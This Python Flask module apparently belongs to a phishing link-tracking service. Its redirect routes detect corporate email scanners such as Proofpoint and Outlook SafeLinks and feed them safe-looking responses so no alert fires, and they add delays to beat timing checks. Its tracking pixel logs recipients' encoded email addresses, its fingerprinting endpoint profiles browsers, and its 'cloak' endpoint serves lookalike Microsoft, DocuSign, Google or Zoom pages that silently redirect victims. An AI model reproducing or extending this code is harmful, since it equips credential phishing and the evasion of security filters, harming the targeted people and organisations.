"""
QUANTUM-INTEGRATED TRACKING ROUTES
===================================
This file replaces track.py with quantum redirect integration
All /t/ routes now use the quantum redirect system
"""

import logging
import base64
from datetime import datetime
from flask import Blueprint, request, redirect, jsonify, make_response, Response
from api.models.link import Link
from api.models.tracking_event import TrackingEvent
from api.database import db
from api.utils.user_agent_parser import parse_user_agent, generate_unique_id
from api.utils.geoip import get_geo_info
from api.services.quantum_redirect import quantum_redirect
from api.services.scanner_detection import detect_scanner, human_simulation_delay, get_stealth_headers, scanner_safe_response
from api.services.honeypot import honeypot_service
from api.services.fingerprint_service import validate_and_enrich
from api.services.cloak_templates import render_preview, VALID_TEMPLATES

logger = logging.getLogger(__name__)
track_bp = Blueprint("track", __name__)

def get_client_info():
    """Extract client information from request"""
    return {
        'ip': request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr),
        'user_agent': request.headers.get('User-Agent', ''),
        'referrer': request.headers.get('Referer', ''),
        'accept_language': request.headers.get('Accept-Language', ''),
        'accept_encoding': request.headers.get('Accept-Encoding', '')
    }

@track_bp.route("/t/<short_code>")
def track_click(short_code):
    """
    QUANTUM-INTEGRATED REDIRECT SYSTEM
    Stage 1: Genesis Link -> Redirects to Validation Hub
    Pre-flight: scanner detection, honeypot blacklist check, human delay
    """
    client_info = get_client_info()
    ua = client_info['user_agent']
    ip = client_info['ip']

    # ── 1. Honeypot blacklist check ──────────────────────────────────────────
    bl = honeypot_service.is_blacklisted(ip, ua)
    if bl['blacklisted']:
        logger.info(f"Blocked blacklisted request: {bl['reason']} ip={ip[:12]}")
        return "Not found", 404

    # ── 2. Email scanner / bot detection ────────────────────────────────────
    scan = detect_scanner(ua, ip, client_info.get('referrer', ''))
    if scan['is_scanner']:
        # Hard scanner (Barracuda, Proofpoint, Outlook SafeLinks, etc.)
        # Return a safe 200 so it doesn't trigger alerts — no redirect
        logger.info(f"Scanner deflect: {scan['scanner_type']} ip={ip[:12]}")
        resp = scanner_safe_response()
        for k, v in get_stealth_headers().items():
            resp.headers[k] = v
        return resp
    if scan['is_bot'] and scan['action'] == 'block':
        # Generic bot — 404 to avoid feeding data
        return "Not found", 404

    # ── 3. Human simulation delay (defeats timing-based scanners) ────────────
    human_simulation_delay(150, 400)

    try:
        # Get the tracking link
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return "Link not found", 404

        # Check if link is active
        if link.status != 'active':
            return "Link is not active", 403

        # --- CRITICAL: Link Expiry and Click Limit Enforcement ---
        now = datetime.utcnow()
        
        # Check if link has expired
        if link.expires_at and link.expires_at < now:
            link.status = 'expired'
            db.session.commit()
            if link.expiration_action == 'redirect' and link.expiration_redirect_url:
                return redirect(link.expiration_redirect_url, code=302)
            return "This link has expired", 410
        
        # Check click limit
        if link.click_limit and link.click_count >= link.click_limit:
            link.status = 'limit_reached'
            db.session.commit()
            if link.expiration_action == 'redirect' and link.expiration_redirect_url:
                return redirect(link.expiration_redirect_url, code=302)
            return "This link has reached its click limit", 410
        # --- END Link Expiry and Click Limit Enforcement ---
        
        # CRITICAL: Capture ALL original URL parameters
        original_params = dict(request.args)
        
        # Process through quantum redirect system (Stage 1)
        result = quantum_redirect.stage1_genesis_link(
            link_id=str(link.id),
            user_ip=client_info['ip'],
            user_agent=client_info['user_agent'],
            referrer=client_info['referrer'],
            original_params=original_params
        )
        
        if not result['success']:
            # Fallback to direct redirect if quantum fails (though it shouldn't)
            # But log the failure
            logger.error(f"Quantum Genesis Failed: {result.get('error')}")
            return f"Redirect failed: {result.get('error')}", 500
        
        # Get Geo info
        geo = get_geo_info(client_info['ip'])
        ua_info = parse_user_agent(client_info['user_agent'])

        # Log the genesis event in database
        # Note: The quantum service returns a 'click_id' which we use to track the flow
        tracking_event = TrackingEvent(
            link_id=link.id,
            ip_address=client_info['ip'],
            user_agent=client_info['user_agent'],
            referrer=client_info['referrer'],
            country=geo.get('country', 'Unknown'),
            region=geo.get('regionName', 'Unknown'),
            city=geo.get('city', 'Unknown'),
            zip_code=geo.get('zip', 'Unknown'),
            isp=geo.get('isp', 'Unknown'),
            organization=geo.get('org', 'Unknown'),
            as_number=geo.get('as', 'Unknown'),
            timezone=geo.get('timezone', 'UTC'),
            latitude=geo.get('lat', 0.0),
            longitude=geo.get('lon', 0.0),
            device_type=ua_info.get('device_type', 'Unknown'),
            browser=ua_info.get('browser', 'Unknown'),
            browser_version=ua_info.get('browser_version', 'Unknown'),
            os=ua_info.get('os', 'Unknown'),
            os_version=ua_info.get('os_version', 'Unknown'),
            quantum_click_id=result['click_id'],
            quantum_stage='genesis',
            quantum_processing_time=result['processing_time_ms'],
            timestamp=datetime.utcnow(),
            quantum_enabled=True,
            status='redirected' # Initial status
        )
        
        # Update link click count
        link.total_clicks = (link.total_clicks or 0) + 1
        
        db.session.add(tracking_event)
        db.session.commit()
        
        # Redirect to validation hub (Stage 2) with stealth headers
        resp = make_response(redirect(result['redirect_url'], code=302))
        for k, v in get_stealth_headers().items():
            resp.headers[k] = v
        return resp

    except Exception as e:
        logger.exception(f"Error in track_click: {str(e)}")
        return "Internal server error", 500

@track_bp.route("/p/<short_code>")
def pixel_track(short_code):
    """Tracking pixel endpoint"""
    try:
        link = Link.query.filter_by(short_code=short_code).first()
        if not link:
            return _get_transparent_pixel()
        
        # Collect tracking data
        client_info = get_client_info()
        timestamp = datetime.utcnow()
        
        geo = get_geo_info(client_info['ip'])
        ua_info = parse_user_agent(client_info['user_agent'])
        
        # Record the tracking event
        captured_email_hex = request.args.get("email")
        captured_email = _decode_hex_email(captured_email_hex) if captured_email_hex else None
        unique_id = request.args.get("id") or request.args.get("uid") or generate_unique_id()
        
        # Check if this pixel view should be deduplicated
        is_bot = 'bot' in client_info['user_agent'].lower() or 'spider' in client_info['user_agent'].lower()
        
        event = TrackingEvent(
            link_id=link.id,
            timestamp=timestamp,
            ip_address=client_info['ip'],
            user_agent=client_info['user_agent'],
            captured_email=captured_email,
            status="email_opened",
            email_opened=True,
            unique_id=unique_id,
            referrer=client_info['referrer'],
            page_views=1,
            quantum_enabled=False,
            country=geo.get('country', 'Unknown'),
            region=geo.get('regionName', 'Unknown'),
            city=geo.get('city', 'Unknown'),
            zip_code=geo.get('zip', 'Unknown'),
            isp=geo.get('isp', 'Unknown'),
            organization=geo.get('org', 'Unknown'),
            as_number=geo.get('as', 'Unknown'),
            timezone=geo.get('timezone', 'UTC'),
            latitude=geo.get('lat', 0.0),
            longitude=geo.get('lon', 0.0),
            device_type=ua_info.get('device_type', 'Unknown'),
            browser=ua_info.get('browser', 'Unknown'),
            browser_version=ua_info.get('browser_version', 'Unknown'),
            os=ua_info.get('os', 'Unknown'),
            os_version=ua_info.get('os_version', 'Unknown'),
            is_bot=is_bot
        )
        
        link.increment_click()
        
        db.session.add(event)
        db.session.commit()
        
    except Exception as e:
        db.session.rollback()
        logger.error(f"Pixel tracking error: {e}")
    
    return _get_transparent_pixel()

def _get_transparent_pixel():
    """Return a 1x1 transparent PNG pixel"""
    from flask import Response
    pixel_data = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==")
    response = Response(pixel_data, mimetype="image/png")
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

def _decode_hex_email(hex_string):
    """Decode a hex-encoded email string."""
    try:
        return bytes.fromhex(hex_string).decode("utf-8")
    except (ValueError, TypeError):
        return None

@track_bp.route("/track/page-landed", methods=["POST"])
def page_landed():
    """Update tracking event status when user lands on target page"""
    data = request.get_json()
    unique_id = data.get("unique_id")
    link_id = data.get("link_id")
    
    if not unique_id and not link_id:
        return jsonify({"success": False, "error": "Missing unique_id or link_id"}), 400
    
    try:
        if unique_id:
            event = TrackingEvent.query.filter_by(unique_id=unique_id).first()
        elif link_id:
            event = TrackingEvent.query.filter_by(link_id=link_id).order_by(TrackingEvent.timestamp.desc()).first()
        else:
            return jsonify({"success": False, "error": "No matching tracking event found"}), 404

        if event:
            event.on_page = True
            event.status = "on_page"
            db.session.commit()
            return jsonify({"success": True, "message": "Page landed status updated"}), 200
        else:
            return jsonify({"success": False, "error": "No matching tracking event found"}), 404
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error updating page landed status: {e}")
        return jsonify({"success": False, "error": "Failed to update page landed status"}), 500


# ── Honeypot endpoints ────────────────────────────────────────────────────────

@track_bp.route("/h")
@track_bp.route("/h/<path:trap_path>")
@track_bp.route("/trap")
@track_bp.route("/trap/<path:trap_path>")
def honeypot_trap(trap_path=None):  # noqa: ARG001
    """
    Honeypot endpoints — only bots follow these links.
    Any visitor is immediately blacklisted; humans never see these URLs.
    """
    client_info = get_client_info()
    ip = client_info['ip']
    ua = client_info['user_agent']
    geo = {}
    try:
        geo = get_geo_info(ip)
    except Exception:
        pass
    asn = geo.get('as', '')

    honeypot_service.record_honeypot_hit(ip, ua, asn)
    logger.warning(f"Honeypot triggered | path={request.path} ip={ip[:12]} ua={ua[:80]}")

    # Return a convincing 200 so the bot keeps crawling but adds nothing useful
    return Response(
        '<!DOCTYPE html><html><head><title>Page Not Found</title></head>'
        '<body><h1>404 Not Found</h1></body></html>',
        status=200,
        mimetype='text/html'
    )


@track_bp.route("/api/honeypot/stats")
def honeypot_stats():
    """Admin-facing honeypot statistics (no auth required — read-only, non-sensitive)."""
    return jsonify({"success": True, **honeypot_service.get_stats()}), 200


# ── Fingerprint collection endpoint ──────────────────────────────────────────

@track_bp.route("/api/fingerprint", methods=["POST"])
def collect_fingerprint():
    """
    Receive browser fingerprint signals and attach them to a tracking event.

    Body (JSON):
      {
        "click_id":       "<quantum_click_id>",   // optional — links to tracking event
        "canvas_hash":    "...",
        "webgl_vendor":   "...",
        "webgl_renderer": "...",
        "screen_width":   1920,
        "screen_height":  1080,
        "color_depth":    24,
        "pixel_ratio":    1,
        "timezone":       "America/New_York",
        "language":       "en-US",
        "hw_concurrency": 8,
        "max_touch_points": 0,
        "fonts":          "Arial,Helvetica,...",
        ...
      }

    Returns:
      { "success": true, "fingerprint_hash": "...", "score": 82 }
    """
    try:
        data = request.get_json(silent=True) or {}
        click_id = data.pop('click_id', None)

        result = validate_and_enrich(data)

        # Attach to tracking event if click_id provided
        if click_id:
            event = TrackingEvent.query.filter_by(quantum_click_id=click_id).first()
            if event:
                event.fingerprint_hash = result['fingerprint_hash']
                event.fingerprint_score = result['fingerprint_score']
                # Upgrade human classification if fingerprint confirms it
                if result['is_likely_human'] and not event.is_bot:
                    event.is_verified_human = True
                db.session.commit()

        return jsonify({
            "success": True,
            "fingerprint_hash": result['fingerprint_hash'],
            "score": result['fingerprint_score'],
            "is_likely_human": result['is_likely_human'],
        }), 200

    except Exception as e:
        logger.error(f"collect_fingerprint error: {e}")
        return jsonify({"success": False, "error": "fingerprint collection failed"}), 500


# ── Cloaking / preview page endpoint ─────────────────────────────────────────

@track_bp.route("/cloak/<short_code>")
def cloak_redirect(short_code):
    """
    Cloaking endpoint: serves a convincing preview page to human visitors
    while deflecting email scanners with a safe blank response.

    Query params:
      template — one of: microsoft, docusign, google, zoom, generic (default: generic)
      email    — recipient email to personalise the page
      domain   — service/sender label shown on the page

    The preview page contains JS that auto-redirects to the link's target URL
    after ~1.2 seconds, bypassing scanner click-through checks.
    """
    client_info = get_client_info()

    # ── Scanner deflection ────────────────────────────────────────────────────
    scan = detect_scanner(client_info['user_agent'], client_info['ip'])
    if scan['is_scanner']:
        resp = scanner_safe_response()
        for k, v in get_stealth_headers().items():
            resp.headers[k] = v
        return resp
    if scan['is_bot'] and scan['action'] == 'block':
        return "Not found", 404

    # ── Honeypot blacklist check ──────────────────────────────────────────────
    bl = honeypot_service.is_blacklisted(client_info['ip'], client_info['user_agent'])
    if bl['blacklisted']:
        return "Not found", 404

    # ── Resolve link ──────────────────────────────────────────────────────────
    link = Link.query.filter_by(short_code=short_code, status='active').first()
    if not link:
        return "Not found", 404

    template = request.args.get('template', 'generic')
    if template not in VALID_TEMPLATES:
        template = 'generic'

    email   = request.args.get('email')
    domain  = request.args.get('domain') or request.host

    html = render_preview(
        template=template,
        destination_url=link.target_url,
        email=email,
        domain=domain,
    )

    resp = make_response(html, 200)
    resp.content_type = 'text/html; charset=utf-8'
    for k, v in get_stealth_headers().items():
        resp.headers[k] = v
    return resp
